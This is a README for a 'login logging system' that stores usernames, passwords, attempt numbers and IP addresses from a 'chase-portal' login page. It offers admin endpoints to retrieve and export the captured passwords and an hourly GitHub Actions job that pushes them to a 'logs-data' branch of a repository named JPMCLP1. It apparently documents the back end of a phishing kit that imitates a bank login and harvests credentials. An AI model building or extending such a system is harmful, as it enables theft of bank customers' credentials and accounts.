# Login Logging System

This application uses a **MongoDB + CSV hybrid logging system** with GitHub Actions for automatic backups.

## Architecture

```
Login Attempt
    ↓
Server (server.js) 
    ├→ MongoDB (Primary) [Real-time]
    └→ CSV File (Backup)  [Fallback]
    ↓
GitHub Actions (Hourly)
    └→ Backup to logs-data branch
```

## Setup Instructions

### Option 1: Local MongoDB

1. **Install MongoDB Community Edition**
   - Windows: https://www.mongodb.com/try/download/community
   - macOS: `brew tap mongodb/brew && brew install mongodb-community`
   - Linux: https://docs.mongodb.com/manual/installation/

2. **Start MongoDB**
   ```bash
   # Windows (if installed via MSI)
   net start MongoDB
   
   # macOS
   brew services start mongodb-community
   
   # Linux
   sudo systemctl start mongod
   ```

3. **Create .env file in project root**
   ```bash
   cp .env.example .env
   # Edit .env and keep MONGODB_URI=mongodb://localhost:27017/chase-portal
   ```

4. **Install dependencies**
   ```bash
   npm install
   ```

5. **Start the server**
   ```bash
   npm run dev:all
   ```

### Option 2: MongoDB Atlas (Cloud)

1. **Create a free account**
   - Go to https://www.mongodb.com/cloud/atlas
   - Sign up and create a free cluster

2. **Get your connection string**
   - In Atlas, go to "Connect" → "Drivers"
   - Copy the connection string

3. **Update .env**
   ```env
   MONGODB_URI=mongodb+srv://username:password@cluster.mongodb.net/chase-portal?retryWrites=true&w=majority
   ```

4. **Start the server**
   ```bash
   npm run dev:all
   ```

## API Endpoints

### Log a Login Attempt
**POST** `/api/logs/login`
```json
{
  "username": "john.doe",
  "password": "encrypted_password",
  "attemptNumber": 1,
  "status": "FAILED - Incorrect credentials",
  "timestamp": "2026-06-26T12:34:56.000Z",
  "userAgent": "Mozilla/5.0..."
}
```

### Retrieve Logs (Admin)
**GET** `/api/admin/logs?limit=100&status=FAILED&username=john`

Query Parameters:
- `limit` (default: 100) - Number of logs to return
- `status` - Filter by status (e.g., "FAILED", "SUCCESS")
- `username` - Filter by username (case-insensitive)

Response:
```json
{
  "success": true,
  "count": 5,
  "source": "MongoDB",
  "logs": [
    {
      "_id": "...",
      "timestamp": "2026-06-26T12:34:56.000Z",
      "username": "john.doe",
      "password": "...",
      "attemptNumber": 1,
      "status": "FAILED - Incorrect credentials",
      "userAgent": "Mozilla/5.0...",
      "ipAddress": "192.168.1.1"
    }
  ]
}
```

### Export All Logs as JSON
**GET** `/api/admin/logs/export`

Response:
```json
{
  "timestamp": "2026-06-26T12:34:56.000Z",
  "total": 42,
  "logs": [...]
}
```

### Health Check
**GET** `/api/health`

Response:
```json
{
  "status": "Logger server is running",
  "port": 3001,
  "database": "MongoDB Connected",
  "csvPath": "/path/to/logs/login_attempts.csv",
  "mongodbUri": "mongodb://localhost:27017/chase-portal"
}
```

## Hybrid Storage Approach

### MongoDB (Primary)
- ✅ Real-time access
- ✅ Queryable (search by status, username, date range)
- ✅ Scalable for high volume
- ✅ Advanced indexing and aggregations

### CSV File (Backup)
- ✅ Human-readable
- ✅ Works offline if MongoDB is down
- ✅ Easy to export to Excel/Google Sheets
- ✅ Compliant with logs/.gitignore (not committed to repo)

## GitHub Actions Automatic Backups

A GitHub Actions workflow runs every hour to back up logs:

1. **Triggers**: 
   - Every hour on the hour (0 * * * *)
   - Manual trigger via GitHub Actions UI

2. **What it does**:
   - Fetches all logs
   - Creates a timestamped JSON backup
   - Commits to `logs-data` branch (separate from main)
   - Pushes to GitHub

3. **Accessing backups**:
   - Go to: https://github.com/sapphirenetllc/JPMCLP1
   - Switch to `logs-data` branch
   - Browse `logs-backup/` folder

## Best Practices

✅ **Do:**
- Monitor login attempts for suspicious activity
- Archive old logs regularly
- Use database indexes for performance
- Redact sensitive data in production
- Implement role-based access control for `/api/admin/logs`

❌ **Don't:**
- Store plaintext passwords in production (use bcrypt/hash)
- Expose admin logs endpoint publicly (add authentication)
- Commit `.env` file to version control
- Store logs indefinitely (implement retention policy)

## Troubleshooting

### MongoDB Connection Failed
```
⚠️  MongoDB connection failed. Using CSV fallback.
```
**Solution**: 
- Check if MongoDB service is running: `mongosh`
- Verify connection string in `.env`
- Check firewall/network access
- For Atlas: Verify IP whitelist includes your IP

### Logs Not Showing
```bash
# Check server logs
npm run dev:logger

# Test the endpoint
curl http://localhost:3001/api/health

# Query logs
curl http://localhost:3001/api/admin/logs
```

### GitHub Actions Not Running
- Check `.github/workflows/backup-logs.yml` is committed
- Enable Actions in repository settings
- Verify workflow has necessary permissions

## Environment Variables

| Variable | Required | Default | Description |
|----------|----------|---------|-------------|
| `MONGODB_URI` | No | mongodb://localhost:27017/chase-portal | MongoDB connection string |
| `PORT` | No | 3001 | Server port |
| `GITHUB_TOKEN` | No | - | For authenticated GitHub Actions (optional) |

---

**Last Updated**: June 26, 2026
